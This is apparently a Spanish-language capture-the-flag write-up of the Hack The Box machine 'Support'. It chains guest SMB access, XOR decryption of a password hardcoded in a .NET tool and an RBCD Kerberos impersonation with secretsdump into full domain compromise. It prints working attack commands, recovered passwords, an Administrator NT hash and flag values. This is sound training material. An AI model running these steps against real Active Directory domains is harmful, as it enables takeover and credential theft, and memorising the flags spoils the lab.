---
icon: windows
coverY: 0
coverHeight: 10
tags:
  - reversing
  - .net
  - xor-decrypt
  - genericall
  - smb
  - dcsync
  - ldap
  - active-directory
  - kerberos
---

# Support

## Resumen

### Detalles

| Campo                 | Detalle                           |
| --------------------- | --------------------------------- |
| **Nombre**            | Support                           |
| **Sistema Operativo** | Windows Server 2022 · Build 20348 |
| **Plataforma**        | Hack The Box                      |
| **Fecha**             | 14/11/2026                        |
| **IP Objetivo**       | 10.129.87.203                     |

### Executive Summary

Comencé enumerando los servicios del objetivo y confirmé que se trataba de un\
controlador de dominio Windows Server 2022 dentro del dominio `support.htb`. Al\
probar el acceso Guest por SMB, pude consultar el recurso compartido\
`support-tools` y descargar `UserInfo.exe`. Abrí el ejecutable .NET con ILSpy y\
localicé una contraseña codificada en Base64 junto con la clave `armando`,\
utilizada en una operación XOR. Reproduje el descifrado en Python y recuperé las\
credenciales de `ldap`.

Con esas credenciales consulté la información de los usuarios mediante LDAP.\
La consulta `get-info-users` devolvió un valor asociado a `support`; lo probé\
como contraseña y NetExec confirmó que era válido. Esto me permitió acceder por\
WinRM y leer la flag de usuario. Para la escalada ejecuté SharpHound y revisé\
las relaciones en BloodHound. Comprobé que el grupo `Shared Support Accounts`,\
al que pertenece `support`, tenía `GenericAll` sobre el objeto `DC`. Aproveché\
este permiso para configurar Resource-Based Constrained Delegation (RBCD),\
suplantar a `Administrator` mediante Kerberos, extraer su hash NT y acceder por\
WinRM como administrador.

### Técnicas

* Análisis de un ejecutable .NET con ILSpy.
* Descifrado de una contraseña mediante Base64 y XOR.
* Abuso de `GenericAll`
* Suplantación de `Administrator` mediante Kerberos y extracción de hashes con\
  `secretsdump`.

## Information Gathering

### Port Scanning

#### TCP

Comencé con un escaneo completo de puertos para identificar los servicios\
expuestos.

```bash
sudo nmap -sS -Pn -n -vv --min-rate 5000 -p- 10.129.87.203
```

Después lancé un escaneo de versiones y scripts sobre los puertos encontrados.

```bash
nmap -sCV -Pn -n -v -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49690,49695,49710 10.129.87.203
```

El escaneo mostró varios servicios propios de Active Directory, además de\
WinRM en el puerto `5985`. Después comprobé mediante SMB que el equipo se\
identificaba como `DC` y que ejecutaba Windows Server 2022, Build `20348`.

| Puerto    | Servicio      | Versión                             |
| --------- | ------------- | ----------------------------------- |
| 53/tcp    | domain        | Simple DNS Plus                     |
| 88/tcp    | kerberos-sec  | Microsoft Windows Kerberos          |
| 135/tcp   | msrpc         | Microsoft Windows RPC               |
| 139/tcp   | netbios-ssn   | Microsoft Windows NetBIOS           |
| 389/tcp   | ldap          | Microsoft Active Directory LDAP     |
| 445/tcp   | microsoft-ds? | No identificado                     |
| 464/tcp   | kpasswd5?     | No identificado                     |
| 593/tcp   | ncacn\_http   | Microsoft Windows RPC over HTTP 1.0 |
| 636/tcp   | tcpwrapped    | No identificado                     |
| 3268/tcp  | ldap          | Microsoft Active Directory LDAP     |
| 3269/tcp  | tcpwrapped    | No identificado                     |
| 5985/tcp  | http          | Microsoft HTTPAPI httpd 2.0         |
| 9389/tcp  | mc-nmf        | .NET Message Framing                |
| 49664/tcp | msrpc         | Microsoft Windows RPC               |
| 49667/tcp | msrpc         | Microsoft Windows RPC               |
| 49678/tcp | ncacn\_http   | Microsoft Windows RPC over HTTP 1.0 |
| 49690/tcp | msrpc         | Microsoft Windows RPC               |
| 49695/tcp | msrpc         | Microsoft Windows RPC               |
| 49710/tcp | msrpc         | Microsoft Windows RPC               |

Los scripts de Nmap también indicaron que SMB signing estaba habilitado y era\
obligatorio, y registraron una desviación del reloj de `-1s`.

```
smb2-security-mode:
  3.1.1: Message signing enabled and required
clock-skew: -1s
smb2-time: 2026-11-14T13:03:51
```

### Enumeration

#### Web

Durante el reconocimiento no encontré ninguna aplicación web tradicional. El\
puerto `5985` correspondía al servicio HTTP de WinRM, que utilicé posteriormente\
para obtener acceso remoto al sistema.

#### SMB

Comencé comprobando la información SMB del objetivo.

```bash
nxc smb 10.129.87.203
```

```
[*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

Intenté realizar un `RID brute force` sin credenciales, pero la consulta\
devolvió `STATUS_ACCESS_DENIED`. Repetí el ataque utilizando `guest` sin\
contraseña y conseguí enumerar los RID del dominio.

```bash
nxc smb 10.129.87.203 -u '' -p '' --users
nxc smb 10.129.87.203 -u '' -p '' --rid-brute
nxc smb 10.129.87.203 -u 'guest' -p '' --rid-brute
```

Entre los usuarios que enumeré aparecían los siguientes:

* `Administrator`
* `Guest`
* `krbtgt`
* `DC$`
* `ldap`
* `support`
* `smith.rosario`
* `hernandez.stanley`
* `wilson.shelby`
* `anderson.damian`
* `thomas.raphael`
* `levine.leopoldo`
* `raven.clifton`
* `bardot.mary`
* `cromwell.gerard`
* `monroe.david`
* `west.laura`
* `langley.lucy`
* `daughtler.mabel`
* `stoll.rachelle`
* `ford.victoria`

Después enumeré los recursos compartidos utilizando `guest`.

```bash
nxc smb 10.129.87.203 -u 'guest' -p '' --shares
```

| Share         | Permisos | Notas               |
| ------------- | -------- | ------------------- |
| ADMIN$        | -        | Remote Admin        |
| C$            | -        | Default share       |
| IPC$          | READ     | Remote IPC          |
| NETLOGON      | -        | Logon server share  |
| support-tools | READ     | Support staff tools |
| SYSVOL        | -        | Logon server share  |

Comprobé que `guest` tenía acceso de lectura a `IPC$` y `support-tools`. Revisé\
el contenido de este último recurso para identificar los archivos disponibles.

```bash
smbmap -H 10.129.87.203 -u 'guest' -p '' -r support-tools
```

* `7-ZipPortable_21.07.paf.exe`
* `npp.8.4.1.portable.x64.zip`
* `putty.exe`
* `SysinternalsSuite.zip`
* `UserInfo.exe.zip`
* `windirstat1_1_2_setup.exe`
* `WiresharkPortable64_3.6.5.paf.exe`

Descargué `UserInfo.exe.zip`, lo descomprimí y comprobé que `UserInfo.exe` era\
un ejecutable .NET.

```bash
unzip UserInfo.exe.zip
file UserInfo.exe
```

#### UserInfo.exe

Abrí el ejecutable con ILSpy y revisé `UserInfo > UserInfo.Services > Protected`. Allí encontré la variable `enc_password`, que contenía una cadena\
codificada en Base64, y la variable `key`, cuyo valor era `armando`. Al revisar\
la operación aplicada a cada byte, identifiqué cómo se realizaba el descifrado.

![Análisis de UserInfo.exe en ILSpy: variables enc\_password y key, junto con la rutina de descifrado.](<../../../.gitbook/assets/Análisis de UserInfo.exe en ILSpy variables enc_password y key, junto con la ru.png>)

_Análisis del código .NET de UserInfo.exe con ILSpy._

La primera operación decodifica la cadena Base64 y almacena el resultado en un\
array de bytes.

```cs
byte[] array = Convert.FromBase64String(enc_password);
byte[] array2 = array;
```

Después, el bucle recorre el array y modifica cada byte mediante dos operaciones\
XOR: primero con un byte de la clave, de forma cíclica, y después con el valor\
`0xDF`.

```cs
for (int i = 0; i < array.Length; i++)
{
    array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
}
```

![Fragmento de código de UserInfo.exe que aplica las operaciones XOR.](<../../../.gitbook/assets/Fragmento de código de UserInfo.exe que aplica las operaciones XOR..png>)

_Operación XOR utilizada para recuperar la contraseña._

Por último, `Encoding.Default.GetString(array2)` convierte el array de nuevo a\
texto. Reproduje el mismo procedimiento en Python para recuperar la contraseña\
en texto plano.

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = "armando"

def decrypt_password(enc_password: str, key: str) -> str:
    key_bytes = key.encode("cp1252")
    data = bytearray(base64.b64decode(enc_password))

    for i in range(len(data)):
        data[i] = (data[i] ^ key_bytes[i % len(key_bytes)]) ^ 0xDF

    return data.decode("cp1252", errors="replace")

print(decrypt_password(enc_password, key))
```

Al ejecutar el script recuperé la contraseña correspondiente a la cuenta\
`ldap`.

```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

#### LDAP y Active Directory

Con las credenciales de `ldap` comprobé los permisos SMB y recopilé información\
de Active Directory con NetExec y BloodHound.

```bash
nxc smb 10.129.87.203 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --shares
nxc ldap 10.129.87.203 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --bloodhound -c All --dns-server 10.129.87.203
nxc ldap 10.129.87.203 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -M get-info-users
```

La consulta `get-info-users` devolvió información para el usuario `support`:

```
User: support    Info: Ironside47pleasure40Watchful
```

Probé el valor como contraseña de `support` y NetExec confirmó que las\
credenciales eran válidas frente al dominio.

```bash
nxc ldap 10.129.87.203 -u 'support' -p 'Ironside47pleasure40Watchful'
```

```
[+] support.htb\support:Ironside47pleasure40Watchful
```

#### WinRM

Con las credenciales validadas inicié una sesión remota mediante Evil-WinRM.

```bash
evil-winrm -i 10.129.87.203 -u 'support' -p 'Ironside47pleasure40Watchful'
```

Una vez dentro, comprobé que `support` pertenecía a los grupos `Remote Management Users`, `Domain Users` y `Shared Support Accounts`. Desde esta sesión\
ejecuté SharpHound para recopilar las relaciones y permisos del dominio.

```powershell
.\SharpHound.exe CollectionMethod All
```

![Evidencia de acceso remoto como support y lectura de user.txt.](<../../../.gitbook/assets/Evidencia de acceso remoto como support y lectura de user.txt..png>)

_Acceso por Evil-WinRM como support y lectura de la flag user.txt._

## Explotación

### Foothold

* **Vulnerabilidad:** Credenciales almacenadas en el código de `UserInfo.exe` y\
  expuestas a través del recurso compartido `support-tools`.
* **Exploit:** Análisis estático del ejecutable .NET, recuperación de la\
  contraseña de `ldap` mediante Base64 y XOR, y consulta de la información de\
  usuario para obtener la contraseña de `support`.
* **Procedimiento:**

1. Accedí al recurso `support-tools` con el usuario `guest` y descargué\
   `UserInfo.exe.zip`.
2. Abrí el ejecutable con ILSpy e identifiqué la variable `enc_password` y la\
   clave `armando`. Reproduje en Python la decodificación Base64 y las dos\
   operaciones XOR.
3. Utilicé la contraseña recuperada para autenticarme como `ldap` y consulté la\
   información de los usuarios mediante el módulo `get-info-users` de NetExec.
4. Probé el valor devuelto para `support`. NetExec confirmó que era una\
   contraseña válida y establecí una sesión con Evil-WinRM.

* **Credenciales obtenidas:**

| Usuario   | Contraseña                             |
| --------- | -------------------------------------- |
| `ldap`    | `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` |
| `support` | `Ironside47pleasure40Watchful`         |

* **Evidencia:** `user.txt`

```
84a9b7d4f6e06730cbab038d6ccab8b0
```

### Privesc

* **Vulnerabilidad:** El grupo `Shared Support Accounts`, al que pertenece\
  `support`, tiene permisos `GenericAll` sobre el objeto del controlador de\
  dominio `DC` en Active Directory.
* **Exploit:** Abuso de Resource-Based Constrained Delegation (RBCD) para\
  configurar una cuenta de equipo bajo mi control como principal autorizado a delegar\
  hacia `DC$`, solicitar un ticket Kerberos suplantando a `Administrator` y\
  extraer los hashes del controlador de dominio.
* **Procedimiento:**

1. Ejecuté SharpHound desde la sesión de `support` para recopilar las\
   relaciones de Active Directory y revisé los resultados en BloodHound.

![BloodHound muestra la relación GenericAll desde Shared Support Accounts hacia DC.SUPPORT.HTB.](<../../../.gitbook/assets/BloodHound muestra la relación GenericAll desde Shared Support Accounts hacia DC.png>)

_Relación de permisos identificada en BloodHound: GenericAll sobre el objeto_\
_&#x44;C._

2. Al revisar los resultados, comprobé que `Shared Support Accounts` tenía\
   `GenericAll` sobre `DC.SUPPORT.HTB`. Este permiso me permitió preparar el\
   abuso de RBCD mediante Impacket.
3. Añadí una cuenta de equipo bajo mi control y configuré la delegación hacia `DC$`.

```bash
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 10.129.87.203 'support.htb/support:Ironside47pleasure40Watchful'
impacket-rbcd -delegate-to 'DC$' -delegate-from 'FAKE01$' -dc-ip 10.129.87.203 -action write 'support.htb/support:Ironside47pleasure40Watchful'
```

4. Solicité un ticket de servicio para `cifs/dc.support.htb` suplantando a\
   `Administrator` y configuré la caché Kerberos para utilizarlo.

```bash
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.87.203 support.htb/FAKE01$:"P@ss123"
export KRB5CCNAME='Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache'
```

5. Utilicé el ticket para ejecutar `secretsdump` contra el controlador de\
   dominio y recuperar los hashes disponibles.

```bash
impacket-secretsdump -k dc.support.htb
```

![Salida de impacket-secretsdump con el hash NT de Administrator.](<../../../.gitbook/assets/Salida de impacket-secretsdump con el hash NT de Administrator..png>)

_Extracción de hashes del controlador de dominio mediante el ticket Kerberos._

6. Utilicé el hash NT de `Administrator` para iniciar una sesión mediante\
   Evil-WinRM.

```bash
evil-winrm -i 10.129.87.203 -u 'Administrator' -H 'bb06cbc02b39abeddd1335bc30b19e26'
```

Una vez dentro como `Administrator`, pude leer `root.txt`.

![Lectura de root.txt desde la sesión Evil-WinRM de Administrator.](<../../../.gitbook/assets/Lectura de root.txt desde la sesión Evil-WinRM de Administrator..png>)

_Lectura de root.txt desde la sesión Evil-WinRM de Administrator._

* **Evidencia:** `root.txt`

```
b002f4c139ce8612d852ce191d631211
```
